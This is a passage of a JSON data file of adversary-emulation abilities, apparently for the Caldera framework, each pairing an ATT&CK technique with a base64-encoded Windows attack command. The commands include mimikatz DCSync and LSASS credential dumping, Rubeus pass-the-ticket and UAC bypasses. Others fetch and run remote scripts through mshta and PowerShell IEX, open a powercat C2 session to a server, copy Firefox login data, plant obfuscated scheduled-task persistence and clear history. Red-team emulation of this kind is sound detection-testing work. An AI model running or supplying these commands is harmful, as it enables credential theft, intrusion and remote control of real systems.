"bXNodGEuZXhlIGphdmFzY3JpcHQ6YT0oR2V0T2JqZWN0KCdzY3JpcHQ6aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIxOC4wMDUvc3JjL21zaHRhLnNjdCcpKS5FeGVjKCk7Y2xvc2UoKTs=", "ability_id": "5bb5d966b1e7e3d24560b4381dc4ab9c", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n", "variations": []}, {"test": "Z2V0LXdtaW9iamVjdCAtY2xhc3MgZHNfY29tcHV0ZXIgLW5hbWVzcGFjZSByb290XGRpcmVjdG9yeVxsZGFw", "ability_id": "7c3b3d5303dbd97035b08004bd3ec87c", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Get-wmiobject to Enumerate Domain Controllers", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n", "variations": []}, {"test": "I3tkc3BhdGh9IC1TICN7dHh0X3BheWxvYWR9", "ability_id": "f50ac24a71af47880d39813477d9b341", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "DiskShadow Command Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n", "variations": []}, {"test": "bmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBhZGQgdjR0b3Y0IGxpc3RlbnBvcnQ9MTMzNyBjb25uZWN0cG9ydD0xMzM3IGNvbm5lY3RhZGRyZXNzPTEyNy4wLjAuMQ==", "ability_id": "ba343199a4f15ed6b57eb52412f62e4e", "technique_name": "Proxy: Internal Proxy", "additional_info": {}, "privilege": "", "technique_id": "T1090.001", "platform": "windows", "name": "portproxy reg key", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBkZWxldGUgdjR0b3Y0IGxpc3RlbnBvcnQ9MTMzNyAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw="], "executor": "psh", "access": {}, "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n", "variations": []}, {"test": "JXRtcCVcbWltaWthdHpceDY0XG1pbWlrYXR6LmV4ZSAibHNhZHVtcDo6ZGNzeW5jIC9kb21haW46JXVzZXJkbnNkb21haW4lIC91c2VyOmtyYnRndEAldXNlcmRuc2RvbWFpbiUiICJleGl0Ig==", "ability_id": "1c5ece81f040f7ac981a81add9acdca9", "technique_name": "OS Credential Dumping: DCSync", "additional_info": {}, "privilege": "", "technique_id": "T1003.006", "platform": "windows", "name": "DCSync (Active Directory)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuXGludm9rZS1taW1pLnBzMTtJbnZva2UtTWltaWthdHogLUR1bXBDcmVkcw==", "ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "Elevated", "technique_id": "T1003.001", "platform": "windows", "name": "Powerkatz (Staged)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.katz", "relationships": [{"edge": "has_password", "source": "domain.user.name", "custom_parser_vals": {}, "target": "domain.user.password"}, {"edge": "has_hash", "source": "domain.user.name", "custom_parser_vals": {}, "target": "domain.user.ntlm"}, {"edge": "has_hash", "source": "domain.user.name", "custom_parser_vals": {}, "target": "domain.user.sha1"}]}], "payloads": ["invoke-mimi.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJpbnZva2UtbWltaS5wczEi"], "executor": "psh", "access": {}, "description": "Use Invoke-Mimikatz", "variations": []}, {"test": "QzpcUFNUb29sc1xQc0V4ZWMuZXhlIC1hY2NlcHRldWxhIFxcbG9jYWxob3N0IC13IGM6XCAtYyAkRW52OlRFTVBccnViZXVzLmV4ZSBhc2t0Z3QgL3VzZXI6QWRtaW5pc3RyYXRvciAvcGFzc3dvcmQ6UGFzc3dvcmQgL2RvbWFpbjokRW52OlVTRVJET01BSU4gL291dGZpbGU6dGlja2V0LmtpcmJpOyBTZXQtTG9jYXRpb24gJGVudjpURU1QOyBNb3ZlLUl0ZW0gLUZvcmNlICJcXGxvY2FsaG9zdFxjJFx0aWNrZXQua2lyYmkiIHRpY2tldC5raXJiaTsgV3JpdGUtSG9zdCAiU3VjY2Vzc2Z1bGx5IHJldHJpZXZlZCBUR1QgZnJvbSAnbG9jYWxob3N0Jywgbm93IHJlcXVlc3RpbmcgYSBUR1MgZnJvbSBsb2NhbCI7ICYgIiRFbnY6VEVNUFxydWJldXMuZXhlIiBhc2t0Z3MgL3NlcnZpY2U6Y2lmcy9sb2NhbGhvc3QgL3RpY2tldDp0aWNrZXQua2lyYmkgL3B0dDsgUmVtb3ZlLUl0ZW0gJGVudjpURU1QXHRpY2tldC5raXJiaTsgJiAiJEVudjpURU1QXHJ1YmV1cy5leGUiIHB1cmdl", "ability_id": "f12b4b83ae4eb7e4e1b74d8304cec011", "technique_name": "Use Alternate Authentication Material: Pass the Ticket", "additional_info": {}, "privilege": "", "technique_id": "T1550.003", "platform": "windows", "name": "Rubeus Kerberos Pass The Ticket", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n", "variations": []}, {"test": "W2Vudmlyb25tZW50XTo6T1NWZXJzaW9uLlZlcnNpb24=", "ability_id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8", "technique_name": "System Information Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1082", "platform": "windows", "name": "Find OS Version", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find OS Version", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gLXBhdGggJGVudjpURU1QXGRlbGV0ZW1lX1QxNTUxLjAwNA==", "ability_id": "2fadd8c6533c03271daab1a879ea8ef0", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": "windows", "name": "Delete a single file - Windows PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "variations": []}, {"test": "LlxBa2FnaTY0LmV4ZSAzMCBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGU=", "ability_id": "95ad5d69-563e-477b-802b-4855bfb3be09", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "wow64log DLL Hijack", "requirements": [], "tactic": "privilege-escalation", "buckets": ["privilege-escalation"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["Akagi64.exe"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJBa2FnaTY0LmV4ZSI="], "executor": "psh", "access": {}, "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3QgLU91dEZpbGUgQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb3dubG9hZHNcR29Ub0Fzc2lzdC5leGUgImh0dHBzOi8vbGF1bmNoLmdldGdvLmNvbS9sYXVuY2hlcjIvaGVscGVyP3Rva2VuPWUwLUZhQ2RkeG10TW9YOF9jWTRjenNzblRlR3Z5ODNpaHA4Q0xSRWZ2d1FzaGlCVzBfUmNiZG9hRXA4SUEtUW44d3BiS2xwR0lmbFMtMzlnVzZSdVdSTS1YSHd0a1JWTUxCc3A1UlNLcC1hM1BCTS1QYjFGbGl5NzNFRGdvYXhyLXE4M1d0WGJMS3FENy11M2NmRGw5Z0tzeW1taGRrVEdzWGNEWGlyOTBOcUtqOTJMc05fS3B5WXdWMDZsSXhzZFJla2hOWmpOd2hrV3JCYV9oRzhSUUpxV1NHazZ0a1pMVk11TXVmbW4zN2VDMkNxcWl3cTViQ0duSDVkWWlTVVVza2xTZWRSTGpoNE40NnFQWVQxYkFVMHFEMjVaUHItS3ZmNEt6dTliVDAycTNZbnRqMDJaQTk5VHhMMi1TS3pncnlpem9vcEJQZzRJbGZvNXQ3OFV4S1RZZUV3bzRldFFFQ2ZrQ1J2ZW5rVFJsSUhtb3dkYmQ4OHp6N05pY2NYbmJISlplaGdzNl8tSlNWalFJZFBUWFpiRjlUNXo0NG1pNEJRWU10WkFTM0RFODZGMEMzRDRUY2Q3ZmE1RjZWZThyUVd0N3B2cUZDWXlpSkFhaWxzbHhPdzBMc0d5Rm9rb3k2NXRNRjk4MFJlUDh6aFZjVEtZUDhzOG1oR1hpaFVRSlFQTmsyMFN3JmRvd25sb2FkVHJpZ2dlcj1yZXN0YXJ0JnJlbmFtZUZpbGU9MSI7ICRmaWxlMSA9ICJDOlxVc2Vyc1wiICsgJGVudjp1c2VybmFtZSArICJcRG93bmxvYWRzXEdvVG9Bc3Npc3QuZXhlIjsgU3RhcnQtUHJvY2VzcyAkZmlsZTEgL1M7", "ability_id": "af8cb2bf9b436aae5c106a0a9c207e14", "technique_name": "Remote Access Software", "additional_info": {}, "privilege": "", "technique_id": "T1219", "platform": "windows", "name": "GoToAssist Files Detected Test on Windows", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["dHJ5eyRQYXRoVG9BdG9taWNzRm9sZGVyL1QxMjE5L0Jpbi9Hb1RvQ2xlYW51cC5wczF9IGNhdGNoe30="], "executor": "psh", "access": {}, "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n", "variations": []}, {"test": "Q29weS1JdGVtICIkZW52OkFQUERBVEFcTW96aWxsYVxGaXJlZm94XFByb2ZpbGVzXCIgLURlc3RpbmF0aW9uICRlbnY6dGVtcCAtRm9yY2UgLVJlY3Vyc2U=", "ability_id": "1a9d81f05549fb5061467e303cd8f386", "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "additional_info": {}, "privilege": "", "technique_id": "T1555.003", "platform": "windows", "name": "Simulating access to Windows Firefox Login Data", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6dGVtcFxQcm9maWxlcyIgLUZvcmNlIC1FcnJvckFjdGlvbiBJZ25vcmUgLVJlY3Vyc2U="], "executor": "psh", "access": {}, "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n", "variations": []}, {"test": "d21pYyAvdXNlcjpET01BSU5cQWRtaW5pc3RyYXRvciAvcGFzc3dvcmQ6UEBzc3cwcmQxIC9ub2RlOiIxMjcuMC4wLjEiIHByb2Nlc3MgY2FsbCBjcmVhdGUgbm90ZXBhZC5leGU=", "ability_id": "9722466a6f9f46b84fc93ccea4abf5d5", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMI Execute Remote Process", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["d21pYyAvdXNlcjpET01BSU5cQWRtaW5pc3RyYXRvciAvcGFzc3dvcmQ6UEBzc3cwcmQxIC9ub2RlOiIxMjcuMC4wLjEiIHByb2Nlc3Mgd2hlcmUgbmFtZT0nbm90ZXBhZC5leGUnIGRlbGV0ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n", "variations": []}, {"test": "cmVnIGFkZCBIS0NVXFNPRlRXQVJFXEFUT01JQy1UMTA1My4wMDUgL3YgdGVzdCAvdCBSRUdfU1ogL2QgY0dsdVp5QXhNamN1TUM0d0xqRT0gL2YgJiYgc2NodGFza3MuZXhlIC9DcmVhdGUgL0YgL1ROICJBVE9NSUMtVDEwNTMuMDA1IiAvVFIgImNtZCAvYyBzdGFydCAvbWluIFwiXCIgcG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgSUVYKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoIEhLQ1U6XFxTT0ZUV0FSRVxcQVRPTUlDLVQxMDUzLjAwNSkudGVzdCkpKSIgL3NjIGRhaWx5IC9zdCAwNzo0NQ==", "ability_id": "dc7f97907a13e32093c3bf1468b386c0", "technique_name": "Scheduled Task/Job: Scheduled Task", "additional_info": {}, "privilege": "", "technique_id": "T1053.005", "platform": "windows", "name": "Scheduled Task Executing Base64 Encoded Commands From Registry", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2NodGFza3MgL2RlbGV0ZSAvdG4gIkFUT01JQy1UMTA1My4wMDUiIC9GID5udWwgMj4mMSAmJiByZWcgZGVsZXRlIEhLQ1VcU09GVFdBUkVcQVRPTUlDLVQxMDUzLjAwNSAvRiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the rgistry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n", "variations": []}, {"test": "YmM0MGNmX1QxNTQ4LjAwMi5iYXQ=", "ability_id": "d1b64530f4db495d3bf05f8847f4599a", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC using SilentCleanup task", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["bc40cf_T1548.002.bat"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n", "variations": []}, {"test": "bmV0IHRpbWUgXFxsb2NhbGhvc3QgJiYgdzMydG0gL3R6", "ability_id": "6bcae75374f0e5b9008dc1c830f6dda1", "technique_name": "System Time Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1124", "platform": "windows", "name": "System Time Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n", "variations": []}, {"test": "dGFza2xpc3Q=", "ability_id": "f8de05d1741dcc468f772ab0ff4dac72", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "Process Discovery - tasklist", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIHVybC5kbGwsT3BlblVSTCA2MzFkOWZfaW5kZXguaHRhICYmIHJ1bmRsbDMyLmV4ZSBVUkwuZGxsLEZpbGVQcm90b2NvbEhhbmRsZXIgUGF0aFRvQXRvbWljc0ZvbGRlclxUMTIxOC4wMTFcc3JjXGFrdGV1bGxlbi52YnM=", "ability_id": "e30d392a79640eb86ee5fedd78416a33", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Execution of HTA and VBS Files using Rundll32 and URL.dll", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["631d9f_index.hta"], "cleanup": [], "executor": "cmd", "access": {}, "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n", "variations": []}, {"test": "Q2xlYXItSGlzdG9yeTtDbGVhcg==", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "technique_name": "Indicator Removal on Host: Clear Command History", "additional_info": {}, "privilege": "", "technique_id": "T1070.003", "platform": "windows", "name": "Avoid logs", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Stop terminal from logging history", "variations": []}, {"test": "d21pYyAvbm9kZTpgIiN7cmVtb3RlLmhvc3QuZnFkbn1gIiAvdXNlcjpgIiN7ZG9tYWluLnVzZXIubmFtZX1gIiAvcGFzc3dvcmQ6YCIje2RvbWFpbi51c2VyLnBhc3N3b3JkfWAiIHByb2Nlc3MgY2FsbCBjcmVhdGUgInBvd2Vyc2hlbGwuZXhlIEM6XFVzZXJzXFB1YmxpY1xzNG5kYzR0LmV4ZSAtc2VydmVyICN7c2VydmVyfSAtZ3JvdXAgI3tncm91cH0iOw==", "ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "Start 54ndc47 (WMI)", "requirements": [{"relationship_match": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_admin", "target": "domain.user.name"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn"}], "module": "plugins.stockpile.app.requirements.no_backwards_movement"}], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["d21pYyAvbm9kZTpgIiN7cmVtb3RlLmhvc3QuZnFkbn1gIiAvdXNlcjpgIiN7ZG9tYWluLnVzZXIubmFtZX1gIiAvcGFzc3dvcmQ6YCIje2RvbWFpbi51c2VyLnBhc3N3b3JkfWAiIHByb2Nlc3MgY2FsbCBjcmVhdGUgInRhc2traWxsIC9mIC9pbSBzNG5kYzR0LmV4ZSI="], "executor": "psh", "access": {}, "description": "Remotely executes 54ndc47 over WMI", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLWRlZmF1bHQgLXMgYmFzZSBsb2Nrb3V0ZHVyYXRpb24gbG9ja291dHRocmVzaG9sZCBsb2Nrb3V0b2JzZXJ2YXRpb253aW5kb3cgbWF4cHdkYWdlIG1pbnB3ZGFnZSBtaW5wd2RsZW5ndGggcHdkaGlzdG9yeWxlbmd0aCBwd2Rwcm9wZXJ0aWVz", "ability_id": "e6b2a87d9100b4807c1e4d55eabeaf9c", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Adfind -Listing password policy", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n", "variations": []}, {"test": "Y2VydHV0aWwgLWVuY29kZSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlICV0ZW1wJVxUMTE0MF9jYWxjLnR4dCAmJiBjZXJ0dXRpbCAtZGVjb2RlICV0ZW1wJVxUMTE0MF9jYWxjLnR4dCAldGVtcCVcVDExNDBfY2FsY19kZWNvZGVkLmV4ZQ==", "ability_id": "2f6c932bd5aabd4754c23a8de88a626e", "technique_name": "Deobfuscate/Decode Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1140", "platform": "windows", "name": "Deobfuscate/Decode Files Or Information", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxUMTE0MF9jYWxjLnR4dCA+bnVsIDI+JjEgJiYgZGVsICV0ZW1wJVxUMTE0MF9jYWxjX2RlY29kZWQuZXhlID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvbWFzdGVyL1JlY29uL1Bvd2VyVmlldy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBHZXQtRG9tYWluVXNlciAtdmVyYm9zZQ==", "ability_id": "c84a57391dbc724dc51436deb3e0ca00", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Get-DomainUser with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n", "variations": []}, {"test": "d21pYy5leGUgL05hbWVzcGFjZTpcXHJvb3RcU2VjdXJpdHlDZW50ZXIyIFBhdGggQW50aVZpcnVzUHJvZHVjdCBHZXQgZGlzcGxheU5hbWUgL0Zvcm1hdDpMaXN0", "ability_id": "76147189e1a5880afa047d0869cf6d17", "technique_name": "Software Discovery: Security Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518.001", "platform": "windows", "name": "Security Software Discovery - AV Discovery via WMI", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n", "variations": []}, {"test": "ZGlyIHwgY2xpcCAmJiBlY2hvICJUMTExNSIgPiAldGVtcCVcVDExMTUudHh0ICYmIGNsaXAgPCAldGVtcCVcVDExMTUudHh0", "ability_id": "70795de7cbb842edb029b3378c27c008", "technique_name": "Clipboard Data", "additional_info": {}, "privilege": "", "technique_id": "T1115", "platform": "windows", "name": "Utilize Clipboard to store or execute commands from", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxUMTExNS50eHQgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Add data to clipboard to copy off or execute commands from.\n", "variations": []}, {"test": "SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViY2xpZW50KS5Eb3dubG9hZHN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlc2ltb3JoaW5vL3Bvd2VyY2F0L2ZmNzU1ZWZlYjJhYmMzZjAyZmEwNjQwY2QwMWI4N2M0YTU5ZDZiYjUvcG93ZXJjYXQucHMxJyk7IHBvd2VyY2F0IC1jICN7c2VydmVyX2lwfSAtcCAje3NlcnZlcl9wb3J0fQ==", "ability_id": "e5c77d3f6febbeb1a9291a86089bbf87", "technique_name": "Non-Application Layer Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1095", "platform": "windows", "name": "Powercat C2", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "variations": []}, {"test": "IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IDsgJENvbW1hbmRMaW5lID0gIi9sb2dmaWxlPSAvbG9ndG9jb25zb2xlPWZhbHNlIGAiJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGhgIiI7ICRFeHBlY3RlZE91dHB1dCA9ICdDb25zdHJ1Y3Rvcl8nOyA7ICRUZXN0QXJncyA9IEB7OyAgICAgT3V0cHV0QXNzZW1ibHlEaXJlY3RvcnkgPSAkSW5zdGFsbGVyQXNzZW1ibHlEaXI7ICAgICBPdXRwdXRBc3NlbWJseUZpbGVOYW1lID0gJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7ICAgICBJbnZvY2F0aW9uTWV0aG9kID0gJ0V4ZWN1dGFibGUnOyAgICAgQ29tbWFuZExpbmUgPSAkQ29tbWFuZExpbmU7IH07IDsgJEFjdHVhbE91dHB1dCA9IEludm9rZS1CdWlsZEFuZEludm9rZUluc3RhbGxVdGlsQXNzZW1ibHkgQFRlc3RBcmdzIC1NaW5pbXVtVmlhYmxlQXNzZW1ibHk7IDsgaWYgKCRBY3R1YWxPdXRwdXQgLW5lICRFeHBlY3RlZE91dHB1dCkgezsgICAgIHRocm93IEAiOyBJbnN0YWxsVXRpbCBjbGFzcyBjb25zdHJ1Y3RvciBleGVjdXRpb24gdGVzdCBmYWlsdX